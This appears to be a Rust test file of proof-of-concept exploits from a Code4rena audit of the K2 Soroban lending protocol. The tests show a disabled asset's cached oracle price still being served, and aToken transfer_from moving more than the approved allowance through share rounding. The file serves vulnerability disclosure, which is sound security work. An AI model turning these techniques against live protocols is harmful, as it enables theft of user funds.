// Code4rena 2026-04-K2 — host PoCs for M-25 and M-42.
//
// These tests drop into the contest's C4 PoC template at tests/c4/src/lib.rs
// (contractimport! modules, MockReflector, the Setup scaffold and the
// ASSET_DECIMALS / PRICE_ONE_DOLLAR constants are assumed to be present).
// Each test hard-asserts the vulnerable behaviour, so it PASSES against the
// unmodified contest snapshot and FAILS once the fix is applied.
//
// Run (from the contest repo root):
//   bash build.sh
//   cargo test -p k2-c4 test_poc_high_oracle_vector_cache_serves_disabled_asset_price_confirmed -- --nocapture
//   cargo test -p k2-c4 test_poc_medium_atoken_transfer_from_allowance_can_move_more_than_approved -- --nocapture

// ---- Additional imports -----------------------------------------------------
use k2_shared::{Asset as SharedAsset, PriceData};
use k2_shared::{KineticRouterError, RAY};
use soroban_sdk::symbol_short;

// ===========================================================================
// M-25 — Oracle vector cache serves a disabled asset price
// ===========================================================================

#[contract]
pub struct MockPriceSource;

#[contractimpl]
impl MockPriceSource {
    pub fn decimals(_env: Env) -> Option<u32> {
        Some(14)
    }

    pub fn lastprice(env: Env, _asset: SharedAsset) -> Option<PriceData> {
        Some(PriceData {
            price: PRICE_ONE_DOLLAR,
            timestamp: env.ledger().timestamp(),
        })
    }
}

#[test]
fn test_poc_high_oracle_vector_cache_serves_disabled_asset_price_confirmed() {
    let env = Env::default();
    let setup = Setup::new(&env);
    let asset = OracleAsset::Stellar(setup.asset_a.clone());
    let source = env.register(MockPriceSource, ());

    setup.oracle.set_price_cache_ttl(&setup.admin, &3600);
    setup
        .oracle
        .set_manual_override(&setup.admin, &asset, &None, &None);
    setup
        .oracle
        .set_custom_oracle(&setup.admin, &asset, &Some(source), &Some(3600), &Some(14));

    let mut assets = Vec::new(&env);
    assets.push_back(asset.clone());

    // Seed the vector-path price cache while the asset is still enabled.
    let seeded_prices = setup.oracle.get_asset_prices_vec(&assets);
    assert_eq!(seeded_prices.get(0).unwrap().price, PRICE_ONE_DOLLAR);

    // Admin disables the asset as an explicit risk-control action.
    setup.oracle.set_asset_enabled(&setup.admin, &asset, &false);

    // The single-asset path correctly rejects the disabled asset.
    assert!(
        setup.oracle.try_get_asset_price_data(&asset).is_err(),
        "single-asset oracle path should reject the disabled asset"
    );

    // Bug: the vector path still serves the cached price for the disabled
    // asset. On patched source this call returns an error and panics here.
    let prices = setup.oracle.get_asset_prices_vec(&assets);
    assert_eq!(
        prices.get(0).unwrap().price,
        PRICE_ONE_DOLLAR,
        "bug: vector oracle path served a cached price for a disabled asset"
    );
}

// ===========================================================================
// M-42 — transfer_from spends nominal allowance but debits rounded-up scaled shares
// ===========================================================================

#[contract]
pub struct MockATokenRouter;

#[contractimpl]
impl MockATokenRouter {
    pub fn initialize(env: Env, liquidity_index: u128) {
        env.storage()
            .instance()
            .set(&symbol_short!("idx"), &liquidity_index);
    }

    pub fn get_current_liquidity_index(env: Env, _asset: Address) -> u128 {
        env.storage()
            .instance()
            .get(&symbol_short!("idx"))
            .unwrap_or(RAY)
    }

    pub fn is_whitelisted_for_reserve(_env: Env, _asset: Address, _account: Address) -> bool {
        true
    }

    pub fn is_blacklisted_for_reserve(_env: Env, _asset: Address, _account: Address) -> bool {
        false
    }

    pub fn validate_and_finalize_transfer(
        env: Env,
        _underlying_asset: Address,
        _from: Address,
        _to: Address,
        amount: u128,
        _from_balance_after: u128,
        _to_balance_after: u128,
    ) -> Result<(), KineticRouterError> {
        env.storage()
            .instance()
            .set(&symbol_short!("val_amt"), &amount);
        Ok(())
    }

    pub fn last_validation_amount(env: Env) -> u128 {
        env.storage()
            .instance()
            .get(&symbol_short!("val_amt"))
            .unwrap_or(0)
    }
}

#[test]
fn test_poc_medium_atoken_transfer_from_allowance_can_move_more_than_approved() {
    let env = Env::default();
    env.mock_all_auths();
    #[allow(deprecated)]
    env.budget().reset_unlimited();

    let liquidity_index = RAY * 2;
    let router_addr = env.register(MockATokenRouter, ());
    let router = MockATokenRouterClient::new(&env, &router_addr);
    router.initialize(&liquidity_index);

    let admin = Address::generate(&env);
    let underlying_asset = Address::generate(&env);
    let owner = Address::generate(&env);
    let spender = Address::generate(&env);
    let recipient = Address::generate(&env);

    let a_token_addr = env.register(a_token::WASM, ());
    let a_token = a_token::Client::new(&env, &a_token_addr);
    a_token.initialize(
        &admin,
        &underlying_asset,
        &router_addr,
        &String::from_str(&env, "aToken"),
        &String::from_str(&env, "aTKN"),
        &ASSET_DECIMALS,
    );

    a_token.mint_scaled(&router_addr, &owner, &20u128, &liquidity_index);
    assert_eq!(
        a_token.scaled_balance_of(&owner),
        10,
        "test setup expects 20 underlying at index 2.0 to mint 10 scaled shares",
    );

    let approved_amount = 1i128;
    a_token.approve(
        &owner,
        &spender,
        &approved_amount,
        &(env.ledger().sequence() + 100),
    );
    assert_eq!(a_token.allowance(&owner, &spender), approved_amount);

    let owner_before = a_token.balance_of(&owner);
    let recipient_before = a_token.balance_of(&recipient);

    a_token.transfer_from(&spender, &owner, &recipient, &approved_amount);

    let owner_after = a_token.balance_of(&owner);
    let recipient_after = a_token.balance_of(&recipient);
    let owner_debit = owner_before - owner_after;
    let recipient_credit = recipient_after - recipient_before;

    assert_eq!(
        a_token.allowance(&owner, &spender),
        0,
        "allowance accounting only spends the nominal transfer amount"
    );
    assert_eq!(
        a_token.scaled_balance_of(&recipient),
        1,
        "a nominal one-unit transfer_from rounded up to one full scaled share"
    );
    assert!(
        owner_debit > approved_amount,
        "bug: spender was approved for {}, but debited {} indexed aToken units",
        approved_amount,
        owner_debit
    );
    assert_eq!(
        owner_debit, recipient_credit,
        "the excess over allowance is transferred to the recipient"
    );
}
